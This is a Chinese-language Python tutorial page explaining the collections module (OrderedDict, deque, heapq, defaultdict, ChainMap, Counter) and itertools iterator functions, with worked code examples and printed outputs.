# 向OrderedDict中添加key-value对
d['Python'] = 89
d['Swift'] = 92
d['Kotlin'] = 97
d['Go'] = 87
# 遍历OrderedDict的key-value对
for k,v in d.items():
    print(k, v, end=" ")  # Python 89 Swift 92 Kotlin 97 Go 87

# 创建普通的dict对象
my_data = {'Python': 20, 'Swift':32, 'Kotlin': 43, 'Go': 25}
# 创建基于key排序的OrderedDict
d1 = OrderedDict(sorted(my_data.items(), key=lambda t: t[0]))
# 创建基于value排序的OrderedDict
d2 = OrderedDict(sorted(my_data.items(), key=lambda t: t[1]))
print(d1)         # OrderedDict([('Go', 25), ('Kotlin', 43), ('Python', 20), ('Swift', 32)])
print(d2)         # OrderedDict([('Python', 20), ('Go', 25), ('Swift', 32), ('Kotlin', 43)])
print(d1 == d2)   # False

</pre><pre>
由于OrderedDict是有序的,因此Python为之提供了如下两个方法:
popitem(last=True)
默认弹出并返回最右边(最后加入)的key-value对;如果将last参数设为False则弹出并返回最左边(最先加入)的key-value对。

move_to_end(key, last=True)
默认将指定的key-value对移动到最右边(最后加入);如果将last改为False则将指定的key-value对移动到最左边(最先加入)

</pre><textarea>
from collections import OrderedDict
d = OrderedDict.fromkeys('abcde')
# 将b对应的key-value对移动到最右边(最后加入)
d.move_to_end('b')
print(d.keys())                  # odict_keys(['a', 'c', 'd', 'e', 'b'])
# 将b对应的key-value对移动到最左边(最先加入)
d.move_to_end('b', last=False)
print(d.keys())                  # odict_keys(['b', 'a', 'c', 'd', 'e'])
# 弹出并返回最右边(最后加入)的key-value对
print(d.popitem()[0])            # e
# 弹出并返回最左边(最先加入)的key-value对
print(d.popitem(last=False)[0])  # b

</textarea>OrderedDict可以实现一个FIFO(先进先出)的dict,当容量超出限制时先删除最早添加的Key<textarea>
from collections import OrderedDict

class LastUpdatedOrderedDict(OrderedDict):

    def __init__(self, capacity):
        super(LastUpdatedOrderedDict, self).__init__()
        self._capacity = capacity

    def __setitem__(self, key, value):
        containsKey = 1 if key in self else 0
        if len(self) - containsKey >= self._capacity:
            last = self.popitem(last=False)
            print('remove:', last)
        if containsKey:
            del self[key]
            print('set:', (key, value))
        else:
            print('add:', (key, value))
        OrderedDict.__setitem__(self, key, value)

</textarea><pre>
【 deque 】
数据结构有栈、队列、双端队列

栈是一种特殊的线性表,它只允许在一端进行插入、删除操作,这一端被称为栈顶(top),另一端则被称为栈底(bottom)
从栈顶插入一个元素被称为进栈,将一个元素插入栈顶被称为"压入栈",对应的英文说法为push;相应地,从栈顶删除一个元素被称为出栈,将一个元素从栈顶删除被称为"弹出栈",对应的英文说法为pop
对于栈而言,最先入栈的元素位于栈底,只有等到上面所有元素都出栈之后,栈底的元素才能出栈。因此栈是一种后进先出(LIFO)的线性表

队列也是一种特殊的线性表,它只允许在表的前端(front)进行删除操作,在表的后端(rear)进行插入操作。进行插入操作的端被称为队尾,进行删除操作的端被称为队头。
对于一个队列来说,每个元素总是从队列的rear端进入队列的,然后等待该元素之前的所有元素都出队之后,当前元素才能出队,因此队列是一种先进先出(FIFO)的线性表

queue双端队列即deque代表一种特殊的队列,它可以在两端同时进行插入、删除操作
对于一个双端队列来说,它可以从两端分别进行插入、删除操作,如果程序将所有的插入、删除操作都固定在一端进行,那么这个双端队列就变成了栈;如果固定在一端只添加元素,在另一端只删除元素,那么它就变成了队列。因此deque既可被当成队列使用,也可被当成栈使用。

列表也可以用作队列,其中先添加的元素被最先取出即先进先出,然而列表用作这个目的相当低效。因为在列表的末尾添加和弹出元素非常快,但是在列表的开头插入或弹出元素却很慢,因为所有的其他元素都必须移动一位
使用list存储数据时,按索引访问元素很快,但是插入和删除元素就很慢了,因为list是线性存储,数据量大的时候插入和删除效率很低。
deque是为了高效实现插入和删除操作的双向列表,适合用于队列和栈
deque除了实现list的append()和pop()外,还支持appendleft()和popleft(),这样就可以非常高效地往头部添加或删除元素

deque位于collections包下,在交互式解释器中先导入collections包,然后输入[e for e in dir(collections.deque) if not e.startswith('_')]命令来查看deque的全部方法

</pre><textarea>
from collections import deque
print([e for e in dir(deque) if not e.startswith('_')])
# ['append', 'appendleft', 'clear', 'copy', 'count', 'extend', 'extendleft', 'index', 'insert', 'maxlen', 'pop', 'popleft', 'remove', 'reverse', 'rotate']

</textarea><pre>
deque的方法基本都有两个版本,这就体现了它作为双端队列的特征。deque的左边(left)就相当于它的队列头(front),右边(right)就相当于它的队列尾(rear):
append和appendleft:在deque的右边或左边添加元素,也就是默认在队列尾添加元素。
pop和popleft:在deque的右边或左边弹出元素,也就是默认在队列尾弹出元素。
extend和extendleft:在deque的右边或左边添加多个元素,也就是默认在队列尾添加多个元素。

deque中的clear()方法用于清空队列,insert()方法则是线性表的方法,用于在指定位置插入元素

</pre><textarea>
q = deque(['a', 'b', 'c'])
q.append('x')
q.appendleft('y')
print(q)   # deque(['y', 'a', 'b', 'c', 'x'])

</textarea>假如程序要把deque当成栈使用,则意味着只在一端添加、删除元素,因此调用append和pop方法即可,这体现了栈的LIFO的特征<textarea>
from collections import deque
stack = deque(('Kotlin', 'Python'))
# 元素入栈
stack.append('Erlang')
stack.append('Swift')
print('stack中的元素:' , stack) # stack中的元素: deque(['Kotlin', 'Python', 'Erlang', 'Swift'])
# 元素出栈,后添加的元素先出栈
print(stack.pop())              # Swift
print(stack.pop())              # Erlang
print(stack)                    # deque(['Kotlin', 'Python'])

</textarea>假如程序要把deque当成队列使用,则意味着一端只用来添加元素,另一端只用来删除元素,因此调用append、popleft方法即可,这体现了队列的 FIFO 的特征<textarea>
from collections import deque
q = deque(('Kotlin', 'Python'))
# 元素加入队列
q.append('Erlang')
q.append('Swift')
print('q中的元素:' , q)           # q中的元素: deque(['Kotlin', 'Python', 'Erlang', 'Swift'])
# 元素出队列,先添加的元素先出队列
print(q.popleft())                # Kotlin
print(q.popleft())                # Python
print(q)                          # deque(['Erlang', 'Swift'])

</textarea>deque还有一个rotate()方法,该方法的作用是将队列的队尾元素移动到队头,使之首尾相连,每次执行rotate()方法,deque的队尾元素都会被移到队头,这样就形成了首尾相连的效果<textarea>
from collections import deque
q = deque(range(5))
print('q中的元素:' , q)   # q中的元素: deque([0, 1, 2, 3, 4])
# 执行旋转,使之首尾相连
q.rotate()
print('q中的元素:' , q)   # q中的元素: deque([4, 0, 1, 2, 3])
# 再次执行旋转,使之首尾相连
q.rotate()
print('q中的元素:' , q)   # q中的元素: deque([3, 4, 0, 1, 2])

</textarea><pre>
【 heapq 堆操作 】
假设有n个数据元素的序列k0,k1,...,kn-1,当且仅当满足ki≤k2i+1且ki≤k2i+2(其中 i=0,2,...,(n-1)/2)时可以将这组数据称为小顶堆(小根堆);或者满足ki≥k2i+1且ki≥k2i+2(其中 i=0,2,...,(n-1)/2)时可以将这组数据称为大顶堆(大根堆)。

对于满足小顶堆的数据序列 k0,k1,...,kn-1,如果将它们顺序排成一棵完全二叉树,则此树的特点是:树中所有节点的值都小于其左、右子节点的值,此树的根节点的值必然最小。反之,对于满足大顶堆的数据序列 k0,k1,...,kn-1,如果将它们顺序排成一棵完全二叉树,则此树的特点是:树中所有节点的值都大于其左、右子节点的值,此树的根节点的值必然最大。

通过上面介绍不难发现,小顶堆的任意子树也是小顶堆,大顶堆的任意子树还是大顶堆。

Python 提供的是基于小顶堆的操作,因此 Python 可以对 list 中的元素进行小顶堆排列,这样程序每次获取堆中元素时,总会取得堆中最小的元素。

例如,判断数据序列 9, 30, 49, 46, 58, 79 是否为堆,可以将其转换为一棵完全二叉树

         9(0)
        |     |
      30(1)   49(2)
      |   |       |
  46(3)   58(4)   79(5)

每个节点上的()中的数字代表该节点数据在底层数组中的索引。以上所示的完全二叉树完全满足小顶堆的特征,每个父节点的值总小于或等于它的左、右子节点的值。

Python 并没有提供"堆"这种数据类型,它是直接把列表当成堆处理的。Python 提供的 heapq 包中有一些函数,当程序用这些函数来操作列表时,该列表就会表现出"堆"的行为。

在交互式解释器中先导入 heapq 包,然后输入 heapq.__all__ 命令来查看 heapq 包下的全部函数,可以看到如下输出结果:
>>> heapq.__all__
['heappush', 'heappop', 'heapify', 'heapreplace', 'merge', 'nlargest', 'nsmallest', 'heappushpop']

上面这些函数就是执行堆操作的工具函数,这些函数的功能大致如下:
heappush(heap, item):将 item 元素加入堆。
heappop(heap):将堆中最小元素弹出。
heapify(heap):将堆属性应用到列表上。
heapreplace(heap, x):将堆中最小元素弹出,并将元素x 入堆。
merge(*iterables, key=None, reverse=False):将多个有序的堆合并成一个大的有序堆,然后再输出。
heappushpop(heap, item):将item 入堆,然后弹出并返回堆中最小的元素。
nlargest(n, iterable, key=None):返回堆中最大的 n 个元素。
nsmallest(n, iterable, key=None):返回堆中最小的 n 个元素。

</pre><textarea>
from heapq import *
my_data = list(range(10))
my_data.append(0.5)
# 此时my_data依然是一个list列表
print('my_data的元素:', my_data)
# 对my_data应用堆属性,调用heapify()函数对列表执行堆操作
heapify(my_data)
print('应用堆之后my_data的元素:', my_data)  # [0 , 0.5, 2, 3, 1, 5, 6, 7, 8, 9, 4],看死杂乱无序的,但其实完全满足小顶堆的特征
# 调用 heappush(my_data, 7.2) 向堆中加入一个元素
heappush(my_data, 7.2)
print('添加7.2之后my_data的元素:', my_data) # [0, 0.5, 2, 3, 1, 5, 6, 7, 8, 9, 4,7.2]

# 弹出堆中最小的元素
print(heappop(my_data)) # 0
print(heappop(my_data)) # 0.5
print('弹出两个元素之后my_data的元素:', my_data)  # [1, 3, 2, 7, 4, 5, 6, 7.2, 8, 9],此时my_data的元素依然满足小顶堆的特征

# 弹出最小元素,压入指定元素
print(heapreplace(my_data, 8.1))                # 1
print('执行replace之后my_data的元素:', my_data)  # [2, 3, 5, 7, 4, 8.1, 6, 7.2, 8, 9]

# 也可以测试通过 nlargest()、nsmallest() 来获取最大、最小的 n 个元素
print('my_data中最大的3个元素:', nlargest(3, my_data))  # [9, 8.1, 8]
print('my_data中最小的4个元素:', nsmallest(4, my_data)) # [2, 3, 4, 5]

</textarea><pre>
Python的heapq包中提供的函数,其实就是提供对排序算法中"堆排序"的支持。Python通过在底层构建小顶堆,从而对容器中的元素进行排序,以便程序能快速地获取最小、最大的元素,因此使用起来非常方便。
提示:当程序要获取列表中最大的 n 个元素,或者最小的 n 个元素时,使用堆能缓存列表的排序结果,因此具有较好的性能

</pre><pre>
【 defaultdict 】
defaultdict是dict的子类,因此defaultdict也可被当成dict来使用,dict支持的功能defaultdict基本都支持。但它与dict最大的区别在于,如果程序试图根据不存在的key采访问dict中对应的value则会引发KeyError异常;而defaultdict则可以提供一个default_factory属性,该属性所指定的函数负责为不存在的key来生成value

默认值是调用函数返回的,而函数在创建defaultdict对象时传入

</pre><textarea>
from collections import defaultdict
my_dict = {}
# 使用int作为defaultdict的default_factory,key不存在时将会返回int()函数的返回值
my_defaultdict = defaultdict(int)
print(my_defaultdict['a'])  # 0
print(my_dict['a'])         # KeyError

</textarea><textarea>
from collections import defaultdict
dd = defaultdict(lambda: 'N/A')
dd['key1'] = 'abc'
dd['key1']    # 'abc'
dd['key2']    # key2不存在,返回默认值'N/A'

</textarea>假如程序中包含多个 key-value 对数据,在这些 key-value 对中有些 key 是重复的,程序希望对这些 key-value 对进行整理,key 对应一个 list,该 list 中包含这组数据中该 key 对应的所有 value<textarea>
### 使用普通dict来完成
s = [('Python', 1), ('Swift', 2), ('Python', 3), ('Swift', 4), ('Python', 9)]
d = {}
for k, v in s:
    # setdefault()方法用于获取指定key对应的value,如果该key不存在,则先将该key对应的value设置为默认值:[]
    d.setdefault(k, []).append(v)
print(list(d.items()))  # [('Python', [1, 3, 9]), ('Swift', [2, 4])]

### 使用 defaultdict 来处理则简单得多,因为程序可以直接为 defaultdict 中不存在的 key 设置默认的 value
from collections import defaultdict
s = [('Python', 1), ('Swift', 2), ('Python', 3), ('Swift', 4), ('Python', 9)]
# 创建defaultdict,设置由list()函数来生成默认值
d = defaultdict(list)
for k, v in s:
    # 直接访问defaultdict中指定key对应的value即可,如果该key不存在,defaultdict会自动为该key生成默认值
    d[k].append(v)
print(list(d.items()))

</textarea><pre>
【 ChainMap 】
ChainMap是一个方便的工具类,它使用链的方式将多个dict"链"在一起,从而允许程序可直接获取任意一个dict所包含的key对应的value
ChainMap相当于把多个dict合并成一个大的dict,但实际上底层并未真正合并这些dict,因此程序无须调用多个update()方法将多个dict进行合并。所以说ChainMap是一种合并,但实际用起来又具有较好的效果。
由于ChainMap只是将多个dict链在一起,并未真正合并它们,因此在多个dict中完全可能具有重复的key,在这种情况下排在"链"前面的dict中的key具有更高的优先级。

ChainMap可以把一组dict串起来并组成一个逻辑上的dict。ChainMap本身也是一个dict,但是查找的时候会按照顺序在内部的dict依次查找。

使用场景:应用程序往往都需要传入参数,参数可以通过命令行传入,可以通过环境变量传入,还可以有默认参数,可以用ChainMap实现参数的优先级查找,即先查命令行参数,如果没有传入再查环境变量,如果没有就使用默认参数。

</pre>代码演示了如何查找user和color这两个参数<textarea>
from collections import ChainMap
import os, argparse

# 构造缺省参数:
defaults = {
    'color': 'red',
    'user': 'guest'
}

# 构造命令行参数:
parser = argparse.ArgumentParser()
parser.add_argument('-u', '--user')
parser.add_argument('-c', '--color')
namespace = parser.parse_args()
command_line_args = { k: v for k, v in vars(namespace).items() if v }

# 组合成ChainMap:
combined = ChainMap(command_line_args, os.environ, defaults)

# 打印参数:
print('color=%s' % combined['color'])
print('user=%s' % combined['user'])

# 没有任何参数时,打印出默认参数:
$ python3 use_chainmap.py
color=red
user=guest

# 当传入命令行参数时,优先使用命令行参数:
$ python3 use_chainmap.py -u bob
color=red
user=bob

# 同时传入命令行参数和环境变量,命令行参数的优先级较高:
$ user=admin color=green python3 use_chainmap.py -u bob
color=green
user=bob

</textarea><textarea>
from collections import ChainMap
# 定义3个dict对象
a = {'Kotlin': 90, 'Python': 86}
b = {'Go': 93, 'Python': 92}
c = {'Swift': 89, 'Go': 87}
# 将3个dict对象链在一起组成一个ChainMap,就像变成了一个大的dict,这个链的顺序就是a、b、c,因此a的优先级最高,b次之,c最低
cm = ChainMap(a, b , c)
print(cm)             # ChainMap({'Kotlin': 90, 'Python': 86}, {'Go': 93, 'Python': 92}, {'Swift': 89, 'Go': 87})
# 获取Kotlin对应的value
print(cm['Kotlin'])   # 90
# 获取Python对应的value
print(cm['Python'])   # 86
# 获取Go对应的value
print(cm['Go'])       # 93

</textarea>将局部范围的定义、全局范围的定义、Python内置定义链成一个ChainMap,当程序通过该ChainMap获取变量时将会按照局部定义、全局定义、内置定义的顺序执行搜索<textarea>
from collections import ChainMap
import builtins

print([e for e in dir(builtins) if not e.startswith('_')])
# ['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']

my_name = '孙悟空'
def test():
    my_name = 'yeeku'
    # 将locals、globals、buliltins的变量链接成ChainMap
    pylookup = ChainMap(locals(), globals(), vars(builtins))
    # 访问my_name对应的value,优先使用局部范围的定义
    print(pylookup['my_name']) # 'yeeku'
    # 访问len对应的value,由于局部范围、全区范围都找不到,因此访问内置定义的len函数
    print(pylookup['len']) # < built-in function len>

test()

</textarea>优先使用运行程序的指定参数,然后是系统环境变量,最后才使用系统默认值的实现,程序同样将这三个搜索范围链成ChainMap<textarea>
# 程序文件名为ChainMap_test.py
from collections import ChainMap
import os, argparse

# 定义默认参数
defaults = {'color': '蓝色', 'user': 'yeeku'}
# 创建程序参数解析器
parser = argparse.ArgumentParser()
# 为参数解析器添加-u(--user)和-c(--color)参数
parser.add_argument('-u', '--user')
parser.add_argument('-c', '--color')
# 解析运行程序的参数
namespace = parser.parse_args()
# 将程序参数转换成dict
command_line_args = {k:v for k, v in vars(namespace).items() if v}

# 将command_line_args(解析程序参数而来)、os.environ(环境变量)、defaults链成ChainMap
combined = ChainMap(command_line_args, os.environ, defaults)
# 获取color对应的value
print(combined['color'])
# 获取user对应的value
print(combined['user'])
# 获取PYTHONPATH对应的value
print(combined['PYTHONPATH'])

使用如下命令来运行该程序:
python ChainMap_test.py -c 红色 -u Charlie

由于上面命令指定了 -c(对应于color)和 -u(对应于user)参数,在命令行指定的参数的优先级是最高的,因此可以看到如下输出结果:
红色
Charlie
.;d:\python_module

上面输出的最后一行是 PYTHONPATH 环境变量的值。如果使用如下命令来运行该程序:
python ChainMap_test.py

由于上面命令没有指定任何命令行参数,因此程序访问user、color时将会使用defaults字典中key对应的值,所以可以看到如下输出结果:
蓝色
yeeku
.;d:\python_ module

</textarea><pre>
【 Counter类 】
Counter是一个简单的计数器,它可以自动统计容器中各元素出现的次数,例如统计字符出现的个数,Counter实际上也是dict的一个子类,只不过它的key都是其所包含的元素,而它的value则记录了该key出现的次数。因此如果通过Counter并不存在的key访问value将会输出0,代表该key出现了0次

</pre><textarea>
from collections import Counter
c = Counter()
for ch in 'programming':
    c[ch] = c[ch] + 1

print(c)   # 字符'g'、'm'、'r'各出现了两次,其他字符各出现了一次
# Counter({'g': 2, 'm': 2, 'r': 2, 'a': 1, 'i': 1, 'o': 1, 'n': 1, 'p': 1})

</textarea><pre>
程序可通过任何代对象参数来创建Counter对象,此时Counter将会自动统计各元素出现的次数,并以元素为key出现的次数为value来构建Counter对象;程序也能以dict为参数来构建Counter对象;还能通过关键字参数来构建Counter对象

</pre><textarea>
from collections import Counter
c1 = Counter()          # 创建空的Counter对象
c2 = Counter('hannah')  # 以可迭代对象创建Counter对象
print(c2)               # Counter({'h': 2, 'a': 2, 'n': 2})
c3 = Counter(['Python', 'Swift', 'Swift', 'Python', 'Kotlin', 'Python'])  # 以可迭代对象创建Counter对象
print(c3)               # Counter({'Python': 3, 'Swift': 2, 'Kotlin': 1})
c4 = Counter({'red': 4, 'blue': 2})   # 以dict来创建Counter对象
print(c4)               # Counter({'red': 4, 'blue': 2})
c5 = Counter(Python=4, Swift=8)       # 使用关键字参数的语法创建Counter
print(c5)               # Counter({'Swift': 8, 'Python': 4})

</textarea><pre>
事实上Counter继承了dict类,因此它完全可以调用dict所支持的方法。此外Counter还提供了如下三个常用的方法:
elements():该方法返回该Counter所包含的全部元素组成的迭代器。
most_common([n]):该方法返回Counter中出现最多的n个元素。
subtract([iterable-or-mapping]):该方法计算Counter的减法,其实就是计算减去之后各元素出现的次数。

</pre><textarea>
from collections import Counter
cnt = Counter()                # 创建Counter对象
print(cnt['Python'])           # 访问并不存在的key,将输出该key的次数为0
for word in ['Swift', 'Python', 'Kotlin', 'Kotlin', 'Swift', 'Go']:
    cnt[word] += 1
print(cnt)                     # Counter({'Swift': 2, 'Kotlin': 2, 'Python': 1, 'Go': 1})

# 只访问Counter对象的元素
print(list(cnt.elements()))    # ['Swift', 'Swift', 'Python', 'Kotlin', 'Kotlin', 'Go']

# 将字符串(迭代器)转换成Counter
chr_cnt = Counter('abracadabra')
# 获取出现最多的3个字母
print(chr_cnt.most_common(3))  # [('a', 5), ('b', 2), ('r', 2)]

c = Counter(a=4, b=2, c=0, d=-2)
d = Counter(a=1, b=2, c=3, d=4)
# 用Counter对象执行减法,其实就是减少各元素的出现次数
c.subtract(d)
print(c)                       # Counter({'a': 3, 'b': 0, 'c': -3, 'd': -6})

e = Counter({'x': 2, 'y': 3, 'z': -4})
# 调用del删除key-value对,会真正删除该key-value对
del e['y']
print(e)                       # Counter({'x': 2, 'z': -4})
# 访问'w'对应的value,'w'没有出现过,因此返回0
print(e['w']) # 0
# 删除e['w'],删除该key-value对
del e['w']
# 再次访问'w'对应的value,'w'还是没有,因此返回0
print(e['w']) # 0

</textarea>统计列表元素的频数<textarea>
from collections import Counter
l = ['a', 'b', 'c', 'a', 'c', 'c']
print(Counter(l))                # Counter({'c': 3, 'a': 2, 'b': 1})
print(Counter(l)['c'])           # 3
print(Counter(l).most_common())  # [('c', 3), ('a', 2), ('b', 1)]

# 判断字符串的相似度
a, b, c = 'abcde', 'abced', 'abcda'
print(Counter(a))                # Counter({'a': 1, 'b': 1, 'c': 1, 'd': 1, 'e': 1})
print(Counter(a) == Counter(b))  # True
print(Counter(a) == Counter(c))  # False

</textarea><pre>
对于Counter对象还有一些很常用的操作,比如把Counter对象转换成set、list、dict等,程序还可对Counter执行加、减、交、并运算,对Counter进行求正、求负运算等:
加:将两个Counter对象中各key出现的次数相加,且只保留出现次数为正的元素。
减:将两个Counter对象中各key出现的次数相喊,且只保留出现次数为正的元素。
交:取两个Counter对象中都出现的key且各key对应的次数的最小数。
并:取两个Counter对象中各key对应的出现次数的最大数。
求正:只保留Counter对象中出现次数为0或正数的key-value对。
求负:只保留Counter对象中出现次数为负数的key-value对,并将出现次数改为正数

</pre><textarea>
from collections import Counter
# 创建Counter对象
c = Counter(Python=4, Swift=2, Kotlin=3, Go=-2)
# 统计Counter中所有出现次数的总和
print(sum(c.values()))  # 7
# 将Counter转换为list,只保留各key
print(list(c))          # ['Python', 'Swift', 'Kotlin', 'Go']
print([w for w in c if len(w) > 2]) # ['Python', 'Swift', 'Kotlin']
# 将Counter转换为set,只保留各key
print(set(c))           # {'Go', 'Python', 'Swift', 'Kotlin'}
# 将Counter转换为dict
print(dict(c))          # {'Python': 4, 'Swift': 2, 'Kotlin': 3, 'Go': -2}
# 将Counter转换为list,列表元素都是(元素, 出现次数)组
list_of_pairs = c.items()
print(list_of_pairs)    # dict_items([('Python', 4), ('Swift', 2), ('Kotlin', 3), ('Go', -2)])
# 将列表元素为(元素, 出现次数)组的list转换成Counter
c2 = Counter(dict(list_of_pairs))
print(c2)               # Counter({'Python': 4, 'Kotlin': 3, 'Swift': 2, 'Go': -2})
# 获取Counter中最少出现的3个元素
print(c.most_common()[:-4:-1]) # [('Go', -2), ('Swift', 2), ('Kotlin', 3)]
# 清空所有key-value对
c.clear()
print(c)                # Counter()

c = Counter(a=3, b=1, c=-1)
d = Counter(a=1, b=-2, d=3)
# 对Counter执行加法
print(c + d)            # Counter({'a': 4, 'd': 3})
# 对Counter执行减法
print(c - d)            # Counter({'b': 3, 'a': 2})
Counter({'a': 2})
# 对Counter执行交运算
print(c & d)            # Counter({'a': 1})
print(c | d)            # Counter({'a': 3, 'd': 3, 'b': 1})
print(+c)               # Counter({'a': 3, 'b': 1})
print(-d)               # Counter({'b': 2})

</textarea>
</div>

<div id="itertools">
<h4>itertools模块:生成迭代器</h4><pre>
itertools模块中主要包含了一些用于生成迭代器的函数

import itertools
print([e for e in dir(itertools) if not e.startswith('_')])
# ['accumulate', 'chain', 'combinations', 'combinations_with_replacement', 'compress', 'count', 'cycle', 'dropwhile', 'filterfalse', 'groupby', 'islice', 'permutations', 'product', 'repeat', 'starmap', 'takewhile', 'tee', 'zip_longest']

itertools模块中三个生成无限迭代器的函数:
1、count(start, [step])
生成start, start+step, start+2*step,...的迭代器,step默认1。比如使用count(10)生成的迭代器包含:10, 11 , 12 , 13, 14,...

2、cycle(p)
对序列p生成无限循环p0, p1,..., p0, p1,...的迭代器。比如使用cycle('ABCD')生成的迭代器包含:A,B,C,D,A,B,C,D,...

3、repeat(elem [,n])
生成无限个elem元素重复的迭代器,如果指定了参数n则只生成n个elem元素。比如使用repeat(10, 3)生成的法代器包含:10, 10, 10

</pre><textarea>
import itertools as it
# count(10, 3)生成10、13、16……迭代器
for e in it.count(10, 3):
    print(e)
    # 用于跳出无限循环
    if e > 20:
        break

my_counter = 0
# cycle用于对序列生成无限循环的迭代器
for e in it.cycle(['Python', 'Kotlin', 'Swift']):
    print(e)
    # 用于跳出无限循环
    my_counter += 1
    if my_counter > 7:
        break

# repeat用于生成n个元素重复的迭代器
for e in it.repeat('Python', 3):
    print(e)

</textarea><pre>
在itertools模块中还有一些常用的迭代器函数
accumulate(p[,func])
默认生成根据序列p元素累加的迭代器,p0, p0+p1, p0+p1+p2,...序列,如果指定了func函数则用func函数来计算下一个元素的值。

chain(p, q, ...)
将多个序列里的元素"链"在一起生成新的序列。

compress(data, selectors)
根据selectors序列的值对data序列的元素进行过滤。如果selector[0]为真则保留data[0];如果selector[1]为真则保留data[1]......依此类推

dropwhile(pred, seq)
使用pred函数对seq序列进行过滤,从seq中第一个使用pred函数计算为False的元素开始,保留从该元素到序列结束的全部元素。

takewhile(pred, seq)
该函数和上一个函数恰好相反。使用pred函数对seq序列进行过滤,从seq中第一个使用pred函数计算为False的元素开始,去掉从该元素到序列结束的全部元素。

filterfalse(pred, seq)
使用pred函数对seq序列进行过滤,保留seq中使用pred计算为True的元素。比如filterfalse(lambda x:x%2, range(10))得到0, 2, 4, 6, 8

islice(seq, [start,] stop [, step])
其功能类似于序列的slice方法,实际上就是返回seq[start:stop:step]的结果。

starmap(func, seq)
使用func对seq序列的每个元素进行计算,将计算结果作为新的序列元素。当使用func计算序列元素时,支持序列解包。比如seq序列的元素长度为3,那么func可以是一个接收三个参数的函数,该函数将会根据这三个参数来计算新序列的元素。

zip_longest(p,q,...)
将p、q等序列中的元素按索引合并成元组,这些元组将作为新序列的元素

</pre><pre>
import itertools as it
# 默认使用累加的方式计算下一个元素的值
for e in it.accumulate(range(6)):
    print(e, end=', ') # 0, 1, 3, 6, 10, 15
print('\n---------')
# 使用x*y的方式来计算迭代器下一个元素的值
for e in it.accumulate(range(1, 6), lambda x, y: x * y):
    print(e, end=', ') # 1, 2, 6, 24, 120
print('\n---------')
# 将两个序列"链"在一起,生成新的迭代器
for e in it.chain(['a', 'b'], ['Kotlin', 'Swift']):
    print(e, end=', ') # 'a', 'b', 'Kotlin', 'Swift'
print('\n---------')
# 根据第二个序列来筛选第一个序列的元素,
# 由于第二个序列只有中间两个元素为1(True),因此前一个序列只保留中间两个元素
for e in it.compress(['a', 'b', 'Kotlin', 'Swift'], [0, 1, 1, 0]):
    print(e, end=', ') # 只有: 'b', 'Kotlin'
print('\n---------')
# 获取序列中从长度不小于4的元素开始、到结束的所有元素
for e in it.dropwhile(lambda x:len(x)<4, ['a', 'b', 'Kotlin', 'x', 'y']):
    print(e, end=', ') # 只有: 'Kotlin', 'x', 'y'
print('\n---------')
# 去掉序列中从长度不小于4的元素开始、到结束的所有元素
for e in it.takewhile(lambda x:len(x)<4, ['a', 'b', 'Kotlin', 'x', 'y']):
    print(e, end=', ')  # 只有: 'a', 'b'
print('\n---------')
# 只保留序列中从长度不小于4的元素
for e in it.filterfalse(lambda x:len(x)<4, ['a', 'b', 'Kotlin', 'x', 'y']):
    print(e, end=', ') # 只有: 'Kotlin'
print('\n---------')
# 使用pow函数对原序列的元素进行计算,将计算结果作为新序列的元素
for e in it.starmap(pow, [(2,5), (3,2), (10,3)]):
    print(e, end=', ') # 32, 9, 1000
print('\n---------')
# 将'ABCD'、'xy'的元素按索引合并成元组,这些元组作为新序列的元素
# 长度不够的序列元素使用'-'字符代替
for e in it.zip_longest('ABCD', 'xy', fillvalue='-'):
    print(e, end=', ') # ('A', 'x'), ('B', 'y'), ('C', '-'), ('D', '-')

# 输出:
0, 1, 3, 6, 10, 15,
---------
1, 2, 6, 24, 120,
---------
a, b, Kotlin, Swift,
---------
b, Kotlin,
---------
Kotlin, x, y,
---------
a, b,
---------
Kotlin,
---------
32, 9, 1000,
---------
('A', 'x'), ('B', 'y'), ('C', '-'), ('D', '-'),

</pre><pre>
itertools模块中用于生成排列组合的工具函数
product(p, q, ...[repeat= 1)]:用序列p 、q 、...中的元素进行排列组合,就相当于使用嵌套循环组合。
permutations(p[, r]):从序列p中取出r个元素组成全排列,将排列得到的元组作为新迭代器的元素。
combinations(p, r):从序列p中取出r个元素组成全组合,元素不允许重复,将组合得到的元组作为新迭代器的元素。
combinations with_replacement(p, r),从序列p中取出r个元素组成全组合,元素允许重复,将组合得到的元组作为新迭代器的元素。

</pre><textarea>
import itertools as it
# 使用两个序列进行排列组合
for e in it.product('AB', 'CD'):
    print(''.join(e), end=', ') # AC, AD, BC, BD,
print('\n---------')
# 使用一个序列、重复2次进行全排列
for e in it.product('AB', repeat=2):
    print(''.join(e), end=', ') # AA, AB, BA, BB,
print('\n---------')
